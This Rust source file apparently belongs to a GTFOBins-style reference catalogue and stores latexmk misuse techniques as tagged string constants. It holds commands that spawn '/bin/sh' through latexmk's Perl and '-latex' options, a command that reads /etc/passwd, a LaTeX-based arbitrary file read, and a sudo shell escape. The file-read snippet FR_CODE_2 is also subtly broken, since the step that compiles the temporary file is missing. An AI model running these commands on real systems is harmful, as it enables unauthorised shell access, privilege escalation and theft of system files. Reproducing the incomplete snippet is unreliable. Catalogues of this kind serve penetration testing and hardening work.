pub static BIN_NAME: &'static str = "latexmk";
pub static SH_CODE_1: &'static str = r#"
    
    latexmk -e 'exec "/bin/sh";'
"#;
pub static SH_CODE_2: &'static str = r#"
    
    latexmk -latex='/bin/sh #' /dev/null
"#;
pub static FR_CODE_1: &'static str = r#"
    
    latexmk -e 'open(X,"/etc/passwd");while(<X>){print $_;}exit'
"#;
pub static FR_DESC_2: &'static str = "The read file will be part of the output.";
pub static FR_CODE_2: &'static str = r#"
    
    TF=$(mktemp)
    echo '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{file_to_read}\end{document}' >$TF
    strings tmp.dvi
"#;
pub static SUDO_CODE: &'static str = r#"
    
    sudo latexmk -e 'exec "/bin/sh";'
"#;
use crate::code::{Code, Tag};
pub static SH_1: Code<'static> = Code {
    title: "SH_CODE_1",
    code: SH_CODE_1,
    tag: Tag::SH,
};
pub static SH_2: Code<'static> = Code {
    title: "SH_CODE_2",
    code: SH_CODE_2,
    tag: Tag::SH,
};
pub static FR_1: Code<'static> = Code {
    title: "FR_CODE_1",
    code: FR_CODE_1,
    tag: Tag::FR,
};
pub static FR_2: Code<'static> = Code {
    title: "FR_CODE_2",
    code: FR_CODE_2,
    tag: Tag::FR,
};
pub static SUDO: Code<'static> = Code {
    title: "SUDO_CODE",
    code: SUDO_CODE,
    tag: Tag::SUDO,
};
